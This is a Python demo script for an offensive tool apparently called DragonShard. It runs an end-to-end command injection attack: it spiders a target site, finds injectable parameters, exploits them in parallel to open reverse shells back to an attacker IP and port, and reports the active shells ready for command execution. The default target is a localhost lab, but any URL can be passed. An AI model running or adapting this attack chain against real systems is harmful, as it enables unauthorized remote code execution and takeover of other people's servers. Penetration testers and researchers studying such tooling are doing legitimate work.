#!/usr/bin/env python3
"""
Command Injection Exploitation Demo

This script demonstrates DragonShard's end-to-end command injection exploitation:
1. Spider a website to find endpoints
2. Test for command injection vulnerabilities
3. Exploit command injection to get reverse shell
4. Maintain connection and run commands

Usage:
    python scripts/demo_command_injection_exploitation.py [target_url]
"""

import argparse
import logging
import sys
import time
from datetime import datetime

# Add the project root to the path
sys.path.insert(0, '.')

from dragonshard.exploits.command_injection_exploiter import CommandInjectionExploiter

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)


def print_banner():
    """Print the demo banner."""
    banner = """
    ‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
    ‚ïë                    üêâ DragonShard                            ‚ïë
    ‚ïë              Command Injection Exploitation Demo              ‚ïë
    ‚ïë                                                              ‚ïë
    ‚ïë  This demo will:                                             ‚ïë
    ‚ïë  1. Spider a website to find endpoints                      ‚ïë
    ‚ïë  2. Test for command injection vulnerabilities               ‚ïë
    ‚ïë  3. Exploit command injection to get reverse shell          ‚ïë
    ‚ïë  4. Maintain connection and run commands                    ‚ïë
    ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
    """
    print(banner)


def run_demo(target_url: str):
    """Run the command injection exploitation demo."""
    print_banner()
    
    logger.info(f"üéØ Target URL: {target_url}")
    logger.info("üöÄ Starting Command Injection Exploitation Demo")
    
    # Create exploiter
    exploiter = CommandInjectionExploiter()
    
    # Step 1: Spider the website
    print("\n" + "="*60)
    print("üï∑Ô∏è  STEP 1: SPIDERING WEBSITE")
    print("="*60)
    
    start_time = time.time()
    discovered_urls = exploiter.spider_website(target_url)
    spider_time = time.time() - start_time
    
    print(f"üìÑ Discovered {len(discovered_urls)} URLs in {spider_time:.2f} seconds")
    for i, url in enumerate(list(discovered_urls)[:10]):  # Show first 10
        print(f"   {i+1:2d}. {url}")
    if len(discovered_urls) > 10:
        print(f"   ... and {len(discovered_urls) - 10} more URLs")
    
    # Step 2: Discover command injection vulnerabilities
    print("\n" + "="*60)
    print("üîç STEP 2: DISCOVERING COMMAND INJECTION VULNERABILITIES")
    print("="*60)
    
    start_time = time.time()
    vulnerabilities = exploiter.discover_command_injection_vulnerabilities(target_url)
    discovery_time = time.time() - start_time
    
    print(f"üí• Found {len(vulnerabilities)} command injection vulnerabilities in {discovery_time:.2f} seconds")
    
    for i, vuln in enumerate(vulnerabilities):
        print(f"\n   üî• Vulnerability {i+1}:")
        print(f"      URL: {vuln.url}")
        print(f"      Parameter: {vuln.parameter}")
        print(f"      Payload: {vuln.payload}")
        print(f"      Evidence: {vuln.evidence}")
        print(f"      Confidence: {vuln.confidence:.2f}")
        print(f"      Method: {vuln.exploit_method}")
    
    # Step 3: Exploit vulnerabilities with multi-threading
    if vulnerabilities:
        print("\n" + "="*60)
        print("‚ö° STEP 3: EXPLOITING VULNERABILITIES (Multi-threaded)")
        print("="*60)
        
        print(f"   üöÄ Starting concurrent exploitation with 4 threads...")
        start_time = time.time()
        
        # Use the comprehensive exploitation with multi-threading
        results = exploiter.run_comprehensive_exploitation(
            target_url, 
            attacker_ip="127.0.0.1", 
            attacker_port=4444,
            max_workers=4
        )
        
        exploitation_time = time.time() - start_time
        
        print(f"   ‚è±Ô∏è  Total exploitation time: {exploitation_time:.2f} seconds")
        print(f"   üéØ Exploitation attempts: {len(results['exploitations'])}")
        print(f"   ‚úÖ Successful exploitations: {results['successful_exploitations']}")
        print(f"   üîÑ Concurrent threads: {results['concurrent_exploitations']}")
        
        # Show successful exploitations
        for i, exploitation in enumerate(results['exploitations']):
            if exploitation.get('connection_successful'):
                print(f"\n   üéâ SUCCESS! Exploitation {i+1}:")
                print(f"      URL: {exploitation['vulnerability']['url']}")
                print(f"      Parameter: {exploitation['vulnerability']['parameter']}")
                print(f"      Method: {exploitation['vulnerability']['exploit_method']}")
                print(f"      Connection ID: {exploitation.get('reverse_shell_connection_id')}")
                print(f"      Port: {exploitation.get('reverse_shell_port')}")
                print(f"      Time: {exploitation.get('exploitation_time', 0):.2f} seconds")
                
                # Show sample output
                if exploitation.get('output_captured'):
                    print(f"      üìÑ Sample output:")
                    for j, output in enumerate(exploitation['output_captured'][:3]):
                        print(f"         {j+1}. {output[:100]}...")
    
    # Step 4: Summary
    print("\n" + "="*60)
    print("üìä STEP 4: EXPLOITATION SUMMARY")
    print("="*60)
    
    if 'results' in locals():
        # Use results from multi-threaded exploitation
        print(f"üéØ Total vulnerabilities discovered: {len(vulnerabilities)}")
        print(f"‚ö° Exploitation attempts: {len(results['exploitations'])}")
        print(f"‚úÖ Successful exploitations: {results['successful_exploitations']}")
        print(f"üîÑ Concurrent threads used: {results['concurrent_exploitations']}")
        
        if results['successful_exploitations'] > 0:
            print(f"\nüéâ SUCCESS! DragonShard successfully exploited command injection vulnerabilities!")
            print(f"   Reverse shells are active and ready for command execution.")
        else:
            print(f"\n‚ö†Ô∏è  No successful exploitations. This might be expected in some environments.")
            print(f"   Check the logs for more details.")
    else:
        # Fallback to summary method
        summary = exploiter.get_exploitation_summary()
        print(f"üéØ Total vulnerabilities discovered: {summary['total_vulnerabilities_discovered']}")
        print(f"‚ö° Exploitation attempts: {summary['total_exploitations_attempted']}")
        print(f"‚úÖ Successful exploitations: {summary['successful_exploitations']}")
        
        if summary['successful_exploitations'] > 0:
            print(f"\nüéâ SUCCESS! DragonShard successfully exploited command injection vulnerabilities!")
            print(f"   Reverse shells are active and ready for command execution.")
        else:
            print(f"\n‚ö†Ô∏è  No successful exploitations. This might be expected in some environments.")
            print(f"   Check the logs for more details.")
    
    # Step 5: Show active connections
    if hasattr(exploiter, 'reverse_shell_handler'):
        active_connections = exploiter.reverse_shell_handler.get_all_connections()
        if active_connections:
            print(f"\nüîå Active Reverse Shell Connections:")
            for conn in active_connections:
                print(f"   - ID: {conn['connection_id']}")
                print(f"     Port: {conn['port']}")
                print(f"     Status: {conn['status']}")
                print(f"     Remote: {conn.get('remote_address', 'N/A')}:{conn.get('remote_port', 'N/A')}")
    
    print("\n" + "="*60)
    print("üéâ DEMO COMPLETE!")
    print("="*60)


def main():
    """Main function."""
    parser = argparse.ArgumentParser(
        description="DragonShard Command Injection Exploitation Demo"
    )
    parser.add_argument(
        "target_url", 
        nargs="?", 
        default="http://localhost:8082",
        help="Target URL to exploit (default: http://localhost:8082)"
    )
    parser.add_argument(
        "--verbose", "-v",
        action="store_true",
        help="Enable verbose logging"
    )
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    try:
        run_demo(args.target_url)
    except KeyboardInterrupt:
        print("\n\n‚ö†Ô∏è  Demo interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n‚ùå Error during demo: {e}")
        logger.exception("Demo failed")
        sys.exit(1)


if __name__ == "__main__":
    main() 